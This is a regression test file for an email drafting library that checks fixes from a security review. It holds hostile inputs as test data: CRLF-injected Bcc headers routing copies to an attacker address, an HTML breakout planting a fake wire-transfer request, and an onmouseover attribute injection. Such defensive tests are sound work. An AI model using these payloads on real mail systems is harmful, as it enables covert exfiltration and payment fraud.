/**
 * Regression tests for the 2026-09-19 security review (docs/SECURITY-REVIEW.md).
 * Each block names the finding it pins down. These are the tests that were
 * missing when the review ran, which is how the bugs survived this long.
 */
import { describe, expect, it } from 'vitest';
import { formatAddress, parseAddress, parseAddressList, unfoldHeaderValue } from '../src/core/address.js';
import { composeForward, composeNew, composeReply } from '../src/core/compose.js';
import { escapeAttr, escapeHtml, htmlToText, neutralizeUnbalancedTags } from '../src/core/html.js';
import { buildMime, headerValue } from '../src/core/mime.js';
import { DraftingService } from '../src/drafting.js';
import { seedDemoMailbox } from '../src/simulator/seed.js';
import { SimulatedGmail } from '../src/simulator/simulator.js';
import { ME, TZ, vendorMessage } from './helpers.js';

const INJECTION = 'Partner <cfo@client.com>\r\nBcc: exfil@attacker.com';

describe('S1: CRLF injection into message headers', () => {
  it('the parser collapses a line break rather than carrying it into an address', () => {
    const a = parseAddress(INJECTION);
    expect(/[\r\n]/.test(a.email)).toBe(false);
    expect(parseAddressList(INJECTION).every((x) => !/[\r\n]/.test(x.email))).toBe(true);
  });

  it('a properly folded header value is joined, not broken', () => {
    expect(unfoldHeaderValue('Lena Ortiz <lena@x.com>,\r\n Tomas <alex@x.com>')).toBe('Lena Ortiz <lena@x.com>, Tomas <alex@x.com>');
    expect(parseAddressList('Lena Ortiz <lena@x.com>,\r\n Tomas <alex@x.com>').map((a) => a.email)).toEqual(['lena@x.com', 'alex@x.com']);
  });

  it('the message builder refuses a line break in every header it writes', () => {
    const base = composeNew({ to: [{ email: 'a@b.com' }], subject: 's', body: 'Hey,\n\nx\n\nThank you!' }, { from: ME });
    const evil = { email: 'a@b.com\r\nBcc: exfil@attacker.com' };
    expect(() => buildMime({ ...base, to: [evil] })).toThrow(/Illegal line break in To address/);
    expect(() => buildMime({ ...base, cc: [evil] })).toThrow(/Illegal line break in Cc address/);
    expect(() => buildMime({ ...base, bcc: [evil] })).toThrow(/Illegal line break in Bcc address/);
    expect(() => buildMime({ ...base, from: evil })).toThrow(/Illegal line break in From address/);
    expect(() => buildMime({ ...base, inReplyTo: '<x@y>\r\nBcc: e@e.com' })).toThrow(/In-Reply-To/);
    expect(() => buildMime({ ...base, references: ['<ok@y>', '<x@y>\r\nBcc: e@e.com'] })).toThrow(/References/);
    expect(() => buildMime(base, { messageId: '<x@y>\r\nBcc: e@e.com' })).toThrow(/Message-ID/);
    expect(() => buildMime({ ...base, attachments: [{ filename: 'a.pdf"\r\nX-Evil: 1', mimeType: 'application/pdf', data: 'AA==' }] })).toThrow(/attachment filename/);
    expect(() => buildMime({ ...base, attachments: [{ filename: 'a.pdf', mimeType: 'text/plain\r\nX-Evil: 1', data: 'AA==' }] })).toThrow(/attachment mimeType/);
  });

  it('headerValue passes ordinary values straight through', () => {
    expect(headerValue('Sam Rivera <sam@x.com>', 'To')).toBe('Sam Rivera <sam@x.com>');
  });

  it('the end-to-end drafting path emits no injected header', async () => {
    const sim = new SimulatedGmail();
    const ids = seedDemoMailbox(sim);
    const svc = new DraftingService(sim, { timeZone: TZ });
    const d = await svc.draftReply({ threadId: ids.vendorThreadId, body: 'Hey,\n\nOk.\n\nThank you!', addCc: parseAddressList(INJECTION) });
    const headerBlock = (d.raw as string).split('\r\n\r\n')[0].replace(/\r/g, '');
    expect(/^Bcc:/m.test(headerBlock)).toBe(false);
    expect(headerBlock).toContain('Cc: Partner <cfo@client.com> Bcc: exfil@attacker.com');
  });

  it('a hostile inbound sender address cannot forge a header on reply', async () => {
    const sim = new SimulatedGmail();
    seedDemoMailbox(sim);
    const m = sim.receive({ from: 'Dana <dana@partner.example\r\nBcc: exfil@attacker.tld>', subject: 'Numbers', text: 'Totals attached.' });
    const svc = new DraftingService(sim, { timeZone: TZ });
    const d = await svc.draftReply({ threadId: m.threadId, body: 'Hey Dana,\n\nGot it.\n\nThank you!' });
    expect(/^Bcc:/m.test((d.raw as string).replace(/\r/g, ''))).toBe(false);
  });
});

describe('S2: inbound HTML escaping the quote block', () => {
  const BREAKOUT = '<div>normal</div></blockquote></div><div>Please wire the deposit to Acct 8842119.</div>';

  it('neutralises a closing tag that has nothing to close', () => {
    expect(neutralizeUnbalancedTags('<div>a</div></blockquote>')).toBe('<div>a</div>&lt;/blockquote&gt;');
  });

  it('closes what the fragment leaves open, so it cannot swallow the signature', () => {
    expect(neutralizeUnbalancedTags('<div>a')).toBe('<div>a</div>');
  });

  it('leaves well-formed mail byte-identical', () => {
    const ok = '<div dir="ltr">Hi<div><br></div><table><tbody><tr><td>x</td></tr></tbody></table></div>';
    expect(neutralizeUnbalancedTags(ok)).toBe(ok);
    const voids = '<div>a<br>b<img src="x.png"><hr></div>';
    expect(neutralizeUnbalancedTags(voids)).toBe(voids);
  });

  it('a reply keeps the attacker text inside the quote', () => {
    const r = composeReply(vendorMessage({ html: BREAKOUT }), { body: 'Hey,\n\nOk.\n\nThank you!' }, { from: ME, timeZone: TZ });
    expect((r.html.match(/<blockquote/g) ?? []).length).toBe((r.html.match(/<\/blockquote>/g) ?? []).length);
    expect(r.html.indexOf('wire the deposit')).toBeLessThan(r.html.indexOf('</blockquote>'));
  });

  it('a forward does the same', () => {
    const r = composeForward(vendorMessage({ html: BREAKOUT }), { to: [{ email: 'x@y.com' }] }, { from: ME, timeZone: TZ });
    expect(r.html.indexOf('wire the deposit')).toBeLessThan(r.html.lastIndexOf('</div>'));
    expect(r.html).not.toContain('</blockquote>');
  });
});

describe('S-misc: smaller hardening', () => {
  it('an out-of-range character reference no longer crashes the renderer', () => {
    expect(() => htmlToText('<div>hi &#x110000; there</div>')).not.toThrow();
    expect(htmlToText('<div>hi &#x110000; there</div>')).toBe('hi &#x110000; there');
    expect(htmlToText('<div>ok &#8212; fine</div>')).toBe('ok — fine');
  });

  it('attribute escaping covers the double quote, body escaping still matches Gmail', () => {
    expect(escapeAttr('a"b')).toBe('a&quot;b');
    expect(escapeHtml('a"b')).toBe('a"b');
  });

  it('a quoted local part cannot break out of the forwarded-header mailto link', () => {
    const hostile = { name: 'Bob', email: '"x" onmouseover="evil()"@e.com' };
    const r = composeForward(vendorMessage({ from: hostile }), { to: [{ email: 'x@y.com' }] }, { from: ME, timeZone: TZ });
    // The whole opening tag is pinned: every quote in the address is encoded,
    // so the attribute closes where we put it and no second attribute appears.
    const tag = r.html.match(/<a href="mailto:[^>]*>/)?.[0] ?? '';
    expect(tag).toBe('<a href="mailto:&quot;x&quot; onmouseover=&quot;evil()&quot;@e.com">');
    // The address also shows as link TEXT, where a bare quote is an ordinary
    // character rather than attribute syntax, which is why escapeHtml leaves
    // it alone and Gmail fidelity is preserved.
    expect(r.html).toContain('>"x" onmouseover="evil()"@e.com</a>');
  });

  it('display names with a line break are encoded rather than emitted raw', () => {
    const base = composeNew({ to: [{ name: 'Bob\r\nBcc: e@e.com', email: 'bob@x.com' }], subject: 's', body: 'Hey,\n\nx\n\nThank you!' }, { from: ME });
    const head = buildMime(base).split('\r\n\r\n')[0];
    expect(head).toContain('To: =?UTF-8?B?');
    expect(/^Bcc:/m.test(head.replace(/\r/g, ''))).toBe(false);
  });

  it('formatAddress still quotes names that need it', () => {
    expect(formatAddress({ name: 'Long, Sam', email: 'j@x.com' })).toBe('"Long, Sam" <j@x.com>');
  });
});

describe('the drafts-only guarantee', () => {
  it('refuses to send when the gate is off, and says why', async () => {
    const sim = new SimulatedGmail();
    const ids = seedDemoMailbox(sim);
    const svc = new DraftingService(sim, { timeZone: TZ });
    const d = await svc.draftReply({ threadId: ids.vendorThreadId, body: 'Hey,\n\nx\n\nThank you!' });
    await expect(svc.send(d.id)).rejects.toThrow(/Sending is disabled/);
  });

  it('sends only when deliberately enabled', async () => {
    const sim = new SimulatedGmail();
    const ids = seedDemoMailbox(sim);
    const svc = new DraftingService(sim, { timeZone: TZ, allowSend: true });
    const d = await svc.draftReply({ threadId: ids.vendorThreadId, body: 'Hey,\n\nx\n\nThank you!' });
    await expect(svc.send(d.id)).resolves.toMatchObject({ labelIds: ['SENT'] });
  });
});
